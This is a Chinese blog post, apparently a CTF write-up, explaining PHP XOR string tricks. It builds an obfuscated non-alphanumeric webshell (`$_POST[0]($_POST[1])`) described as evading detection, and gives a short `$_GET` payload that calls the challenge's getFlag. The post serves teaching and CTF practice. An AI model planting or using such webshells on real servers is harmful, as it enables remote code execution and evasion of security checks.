&lt;p&gt;我们都知道，PHP是弱类型的语言，也就是说在PHP中我们可以不预先声明变量的类型，而直接声明一个变量并进行初始化或赋值操作。正是由于PHP弱类型的这个特点，我们对PHP的变类型进行隐式的转换，并利用这个特点进行一些非常规的操作。如将整型转换成字符串型，将布尔型当作整型，或者将字符串当作函数来处理，下面我们来看一段代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
    &lt;/span&gt;&lt;span&gt;function&lt;/span&gt;&lt;span&gt; B(){
        &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &quot;Hello Angel_Kitty&quot;&lt;span&gt;;
    }
    &lt;/span&gt;&lt;span&gt;$_&lt;/span&gt;++&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;$__&lt;/span&gt;= &quot;?&quot; ^ &quot;}&quot;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;$__&lt;/span&gt;&lt;span&gt;();
&lt;/span&gt;?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;代码执行结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1100338/201808/1100338-20180806203026984-1248488717.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;我们一起来分析一下上面这段代码：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;$_++; 这行代码的意思是对变量名为&quot;_&quot;的变量进行自增操作，在PHP中未定义的变量默认值为null,null==false==0,我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字。&lt;/li&gt;
&lt;li&gt;$__=&quot;?&quot; ^ &quot;}&quot;; 对字符&quot;?&quot;和&quot;}&quot;进行异或运算，得到结果B赋给变量名为&quot;__&quot;(两个下划线)的变量&lt;/li&gt;
&lt;li&gt;$ __ (); 通过上面的赋值操作，变量$__的值为B，所以这行可以看作是B(),在PHP中,这行代码表示调用函数B,所以执行结果为Hello Angel_Kitty。在PHP中，我们可以将字符串当作函数来处理。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;看到这里，相信大家如果再看到类似的PHP后门应该不会那么迷惑了，你可以通过一句句的分析后门代码来理解后门想实现的功能。&lt;/p&gt;
&lt;p&gt;我们希望使用这种后门创建一些可以绕过检测的并且对我们有用的字符串，如_POST&quot;, &quot;system&quot;, &quot;call_user_func_array&quot;，或者是任何我们需要的东西。&lt;/p&gt;
&lt;p&gt;下面是个非常简单的非数字字母的PHP后门：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
    @&lt;/span&gt;&lt;span&gt;$_&lt;/span&gt;++; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; $_ = 1&lt;/span&gt;
    &lt;span&gt;$__&lt;/span&gt;=(&quot;#&quot;^&quot;|&quot;); &lt;span&gt;//&lt;/span&gt;&lt;span&gt; $__ = _&lt;/span&gt;
    &lt;span&gt;$__&lt;/span&gt;.=(&quot;.&quot;^&quot;~&quot;); &lt;span&gt;//&lt;/span&gt;&lt;span&gt; _P&lt;/span&gt;
    &lt;span&gt;$__&lt;/span&gt;.=(&quot;/&quot;^&quot;`&quot;); &lt;span&gt;//&lt;/span&gt;&lt;span&gt; _PO&lt;/span&gt;
    &lt;span&gt;$__&lt;/span&gt;.=(&quot;|&quot;^&quot;/&quot;); &lt;span&gt;//&lt;/span&gt;&lt;span&gt; _POS&lt;/span&gt;
    &lt;span&gt;$__&lt;/span&gt;.=(&quot;{&quot;^&quot;/&quot;); &lt;span&gt;//&lt;/span&gt;&lt;span&gt; _POST &lt;/span&gt;
    ${&lt;span&gt;$__&lt;/span&gt;}[!&lt;span&gt;$_&lt;/span&gt;](${&lt;span&gt;$__&lt;/span&gt;}[&lt;span&gt;$_&lt;/span&gt;]); &lt;span&gt;//&lt;/span&gt;&lt;span&gt; $_POST[0]($_POST[1]);&lt;/span&gt;
?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在这里我说明下，&lt;strong&gt;.=是字符串的连接，具体参看php语法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我们甚至可以将上面的代码合并为一行，从而使程序的可读性更差，代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;$__&lt;/span&gt;=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;{&quot;^&quot;/&quot;);
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;对于文章开始遇到的那道难题，最开始我们的想法是通过构造异或来去绕过那串字符，但由于最后构造的字串远远超过了长度len=40，然后我们最后放弃了~~&lt;/p&gt;
&lt;p&gt;我们该如何构造这个字串使得长度小于40呢？&lt;/p&gt;
&lt;p&gt;我们最终是要读取到那个getFlag函数，我们需要构造一个_GET来去读取这个函数，我们最终构造了如下字符串：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
?code=&lt;span&gt;$_&lt;/span&gt;=&quot;`{{{&quot;^&quot;?&amp;lt;&amp;gt;/&quot;;${&lt;span&gt;$_&lt;/span&gt;}[_](${&lt;span&gt;$_&lt;/span&gt;}[__]);&amp;amp;_=getFlag
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;可能很多小伙伴看完前置知识后仍然无法理解这段字符串是如何构造的吧，我们就对这段字符串进行段分析&lt;/p&gt;
&lt;h2 id=&quot;autoid-0-0-0&quot;&gt;①构造_GET读取&lt;/h2&gt;
&lt;p&gt;首先我们得知道_GET由什么异或而来的，经过我的尝试与分析，我得出了下面的结论：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
    &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &quot;`{{{&quot;^&quot;?&amp;lt;&amp;gt;/&quot;;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;_GET&lt;/span&gt;
?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这段代码一大坨是啥意思呢？因为40个字符长度的限制，导致以前逐个字符异或拼接的webshell不能使用。&lt;br/&gt;这里可以使用php中可以执行命令的反引号&lt;code&gt;` `&lt;/code&gt; 和Linux下面的通配符&lt;code&gt;?&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;?&lt;/code&gt; 代表匹配一个字符&lt;/li&gt;
&lt;li&gt;` 表示执行命令&lt;/li&gt;
&lt;li&gt;&quot; 对特殊字符串进行解析&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;由于?只能匹配一个字符，这种写法的意思是循环调用，分别匹配。我们将其进行分解来看&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
    &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &quot;{&quot;^&quot;&amp;lt;&quot;&lt;span&gt;;
&lt;/span&gt;?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;输出结果为：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1100338/201808/1100338-20180806213001837-1889808102.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
    &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &quot;{&quot;^&quot;&amp;gt;&quot;&lt;span&gt;;
&lt;/span&gt;?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;输出结果为：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1100338/201808/1100338-20180806213057725-384846720.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
    &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &quot;{&quot;^&quot;/&quot;&lt;span&gt;;
&lt;/span&gt;?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;输出结果为：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1100338/201808/1100338-20180806213138797-824067357.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;所以_GET就是这么被构造出来的&lt;/p&gt;
&lt;h2 id=&quot;autoid-0-1-0&quot;&gt;②获取_GET参数&lt;/h2&gt;
&lt;p&gt;如何获取呢？咱们可以构造出如下字串：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
    &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; ${&lt;span&gt;$_&lt;/span&gt;}[_](${&lt;span&gt;$_&lt;/span&gt;}[__]);&lt;span&gt;//&lt;/span&gt;&lt;span&gt;$_GET[_]($_GET[__])&lt;/span&gt;
?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;根据前面构造的来看，$_已经变成了_GET。&lt;/p&gt;
&lt;p&gt;顺理成章的来讲，$_ = _GET这个字符串。&lt;/p&gt;
&lt;p&gt;我们构建$_GET[ __ ]是为了要获取参数值&lt;/p&gt;
&lt;h2 id=&quot;autoid-0-2-0&quot;&gt;③传入参数&lt;/h2&gt;
&lt;p&gt;此时我们只需要去调用getFlag函数获取webshell就好了，构造如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
    &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &lt;span&gt;$_&lt;/span&gt;=getFlag;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;getFlag&lt;/span&gt;
?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;所以把参数全部连接起来，就可以了~~&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
?code=&lt;span&gt;$_&lt;/span&gt;=&quot;`{{{&quot;^&quot;?&amp;lt;&amp;gt;/&quot;;${&lt;span&gt;$_&lt;/span&gt;}[_](${&lt;span&gt;$_&lt;/span&gt;}[__]);&amp;amp;_=getFlag
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1100338/201808/1100338-20180806214606459-300950559.png&quot; alt=&quot;&quot; width=&quot;530&quot; height=&quot;122&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们就成功读取到了flag~~&lt;/p&gt;

&lt;p&gt;我给大家推荐几篇写的比较好的，方便大家能更进一步的理解这个东西。&lt;/p&gt;
</description>
<pubDate>Mon, 06 Aug 2018 13:52:00 +0000</pubDate>
<dc:creator>Angel_Kitty</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html</dc:identifier>
</item>
</channel>
</rss>